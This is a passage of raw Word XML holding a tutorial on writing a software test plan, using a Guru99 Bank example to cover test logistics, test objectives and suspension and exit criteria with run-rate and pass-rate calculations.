      <w:tr w:rsidR="00D01E5E" w:rsidRPr="00B86CAC" w:rsidTr="008E672E">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A lack of cooperation negatively affects your employees' productivity</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="7402"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Encourage </w:t>
            </w:r>
            <w:r w:rsidRPr="00B86CAC">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t>each team member in his task, </w:t>
            </w:r>
            <w:r w:rsidRPr="00E97930">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t>and inspire</w:t>
            </w:r>
            <w:r w:rsidRPr="00B86CAC">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t> them to greater efforts.  </w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00D01E5E" w:rsidRPr="00B86CAC" w:rsidTr="008E672E">
        <w:trPr>
          <w:trHeight w:val="566"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="378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Wrong budget estimate and cost overruns</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="7402"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after="215"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Establish the </w:t>
            </w:r>
            <w:r w:rsidRPr="00E97930">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t>scope</w:t>
            </w:r>
            <w:r w:rsidRPr="00B86CAC">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t> before beginning work, pay a lot of attention to project planning and constantly track and measure the progress</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00D01E5E"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p>
    <w:p w:rsidR="00D01E5E"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2.4) Create Test Logistics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Test Logistics, the Test Manager should answer the following questions:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00B86CAC" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">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Who </w:t>
      </w:r>
      <w:r w:rsidRPr="00B86CAC">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t>will test?</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00B86CAC" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">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When </w:t>
      </w:r>
      <w:r w:rsidRPr="00B86CAC">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t>will the test occur?</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Who will test?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may not know exact names of the tester who will test, but the </w:t>
      </w:r>
      <w:r w:rsidRPr="00E97930">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t>type of tester</w:t>
      </w:r>
      <w:r w:rsidRPr="00B86CAC">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t> can be defined.</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select the right member for specified task, you have to consider if his skill is qualified for the task or not, also estimate the project budget. Selecting wrong member for the task may cause the project to</w:t>
      </w:r>
      <w:r w:rsidRPr="00E97930">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t> fail</w:t>
      </w:r>
      <w:r w:rsidRPr="00B86CAC">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t> or </w:t>
      </w:r>
      <w:r w:rsidRPr="00E97930">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t>delay</w:t>
      </w:r>
      <w:r w:rsidRPr="00B86CAC">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w: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Person having the following skills is most ideal for performing software testing:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00B86CAC" w:rsidRDefault="00D01E5E"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Ability to </w:t>
      </w:r>
      <w:r w:rsidRPr="00E97930">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t>understand</w:t>
      </w:r>
      <w:r w:rsidRPr="00B86CAC">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t> customers point of view</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00B86CAC" w:rsidRDefault="00D01E5E"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Strong </w:t>
      </w:r>
      <w:r w:rsidRPr="00E97930">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t>desire</w:t>
      </w:r>
      <w:r w:rsidRPr="00B86CAC">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t> for quality</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00B86CAC" w:rsidRDefault="00D01E5E"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Attention</w:t>
      </w:r>
      <w:r w:rsidRPr="00B86CAC">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t> to detail</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00B86CAC" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">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Good </w:t>
      </w:r>
      <w:r w:rsidRPr="00E97930">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t>cooperation</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lastRenderedPageBreak/>
        <w:t>In your project, the member who will take in charge for the test execution is the </w:t>
      </w:r>
      <w:r w:rsidRPr="00E97930">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t>tester.</w:t>
      </w:r>
      <w:r w:rsidRPr="00B86CAC">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t> Base on the project budget, you can choose in-source or outsource member as the tester.</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When will the test occur?</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activities must be matched with associated development activities.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will start to test when you have </w:t>
      </w:r>
      <w:r w:rsidRPr="00E97930">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t>all required items</w:t>
      </w:r>
      <w:r w:rsidRPr="00B86CAC">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t> shown in following figure</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3) Define Test Objective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Objective is the overall goal and achievement of the test execution. The objective of the testing is finding as many software defects as possible; ensure that the software under test is </w:t>
      </w:r>
      <w:r w:rsidRPr="00E97930">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t>bug free</w:t>
      </w:r>
      <w:r w:rsidRPr="00B86CAC">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t> before release.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To define the test objectives, you should do 2 following steps</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00B86CAC" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">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List all the software features (functionality, performance, GUI…) which may need to test.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00B86CAC" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">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Define the </w:t>
      </w:r>
      <w:r w:rsidRPr="00E97930">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t>target</w:t>
      </w:r>
      <w:r w:rsidRPr="00B86CAC">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t> or the </w:t>
      </w:r>
      <w:r w:rsidRPr="00E97930">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t>goal</w:t>
      </w:r>
      <w:r w:rsidRPr="00B86CAC">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t> of  the test based on  above features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Let’s apply these steps to find the test objective of your Guru99 Bank testing project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can choose the ‘</w:t>
      </w:r>
      <w:r w:rsidRPr="00E97930">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t>TOP-DOWN’ </w:t>
      </w:r>
      <w:r w:rsidRPr="00B86CAC">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t>method to find the website’s features which may need to test. In this method, you break down the application under test to </w:t>
      </w:r>
      <w:r w:rsidRPr="00E97930">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t>component</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sub-component</w:t>
      </w:r>
      <w:r w:rsidRPr="00B86CAC">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t>.</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In the previous topic, you have already analyzed the requirement specs and walk through the website, so you can create a </w:t>
      </w:r>
      <w:r w:rsidRPr="00E97930">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t>Mind-Map</w:t>
      </w:r>
      <w:r w:rsidRPr="00B86CAC">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t> to find the website features as following</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00E97930" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pP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figure shows all the features which the Guru99 website may have.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Based on above features, you can define the Test Objective of the project Guru99 as following</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00B86CAC" w:rsidRDefault="00D01E5E"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that whether website Guru99 </w:t>
      </w:r>
      <w:r w:rsidRPr="00E97930">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t>functionality</w:t>
      </w:r>
      <w:r w:rsidRPr="00B86CAC">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t>(Account, Deposit…) is working as expected without any error or bugs in real business environment</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00B86CAC" w:rsidRDefault="00D01E5E"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that the external interface of the website such as </w:t>
      </w:r>
      <w:r w:rsidRPr="00E97930">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t>UI</w:t>
      </w:r>
      <w:r w:rsidRPr="00B86CAC">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t> is working as expected and &amp; meet the customer need</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00B86CAC" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">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Verify the </w:t>
      </w:r>
      <w:r w:rsidRPr="00E97930">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t>usability</w:t>
      </w:r>
      <w:r w:rsidRPr="00B86CAC">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t> of the website. Are those functionalities convenient for user or not?</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Step 4) Define Test Criteria</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 xml:space="preserve">Test Criteria is a </w:t>
      </w:r>
      <w:r w:rsidRPr="00877BA3">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t>standard or rule on which a test procedure or test judgment can be based</w:t>
      </w:r>
      <w:r w:rsidRPr="00B86CAC">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t>. There’re 2 types of test criteria as following</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Suspension Criteria</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Specify the critical suspension criteria for a test. If the suspension criteria are met during testing, the active test cycle will be </w:t>
      </w:r>
      <w:r w:rsidRPr="00E97930">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t>suspended</w:t>
      </w:r>
      <w:r w:rsidRPr="00B86CAC">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t> until the criteria are </w:t>
      </w:r>
      <w:r w:rsidRPr="00E97930">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t>resolved</w:t>
      </w:r>
      <w:r w:rsidRPr="00B86CAC">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00E97930" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E97930">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Example: If your team members report that there are </w:t>
      </w:r>
      <w:r w:rsidRPr="00E97930">
        <w:rPr>
          <w:rStyle w:val="Strong"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>40%</w:t>
      </w:r>
      <w:r w:rsidRPr="00E97930">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t> of test cases failed, you should </w:t>
      </w:r>
      <w:r w:rsidRPr="00E97930">
        <w:rPr>
          <w:rStyle w:val="Strong"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>suspend</w:t>
      </w:r>
      <w:r w:rsidRPr="00E97930">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t> testing until the development team fixes all the failed cases</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00E97930" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00E97930" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E97930">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="2D8E6267" wp14:editId="4A61CDC1">
            <wp:extent cx="2922043" cy="248066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921838" cy="2480493"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln w="9525">
                      <a:noFill/>
                      <a:miter lim="800000"/>
                      <a:headEnd/>
                      <a:tailEnd/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>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Exit Criteria</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It specifies the criteria that denote a </w:t>
      </w:r>
      <w:r w:rsidRPr="00E97930">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t>successful</w:t>
      </w:r>
      <w:r w:rsidRPr="00B86CAC">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t> completion of a test phase. The exit criteria are the targeted results of the test and are necessary before proceeding to the next phase of development. Example: </w:t>
      </w:r>
      <w:r w:rsidRPr="00E97930">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t>95%</w:t>
      </w:r>
      <w:r w:rsidRPr="00B86CAC">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t> of all critical test cases must pass.</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Some methods of defining exit criteria are by specifying a targeted </w:t>
      </w:r>
      <w:r w:rsidRPr="00E97930">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t>run rate</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pass rate</w:t>
      </w:r>
      <w:r w:rsidRPr="00B86CAC">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00B86CAC" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="5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Run rate is ratio between </w:t>
      </w:r>
      <w:r w:rsidRPr="00E97930">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t>number test cases executed/total test cases</w:t>
      </w:r>
      <w:r w:rsidRPr="00B86CAC">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t xml:space="preserve"> of test specification. For example, the test specification has total 120 TCs, but the tester only executed 100 TCs, </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00B86CAC">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t>So</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00B86CAC">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t xml:space="preserve"> the run rate is 100/120 = 0.83 (83%)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00B86CAC" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="50"/>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Pass rate is ratio between </w:t>
      </w:r>
      <w:r w:rsidRPr="00E97930">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t>numbers test cases passed / test cases executed</w:t>
      </w:r>
      <w:r w:rsidRPr="00B86CAC">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t>. For example, in above 100 TCs executed, there’re 80 TCs that passed, so the pass rate is 80/100 = 0.8 (80%)</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data can be retrieved in Test Metric documents.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00B86CAC" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">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Run</w:t>
      </w:r>
      <w:r w:rsidRPr="00B86CAC">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t> rate is mandatory to be </w:t>
      </w:r>
      <w:r w:rsidRPr="00E97930">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t>100% </w:t>
      </w:r>
      <w:r w:rsidRPr="00B86CAC">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t>unless a clear reason is given.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00B86CAC" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">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Pass</w:t>
      </w:r>
      <w:r w:rsidRPr="00B86CAC">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t> rate is dependent on project scope, but </w:t>
      </w:r>
      <w:r w:rsidRPr="00E97930">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t>achieving high pass rate</w:t>
      </w:r>
      <w:r w:rsidRPr="00B86CAC">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t> is a goal.</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Example:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00B86CAC">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t>Your Team has already done the test executions. They report the test result to you, and they want you to confirm the </w:t>
      </w:r>
      <w:r w:rsidRPr="00E97930">
        <w:rPr>
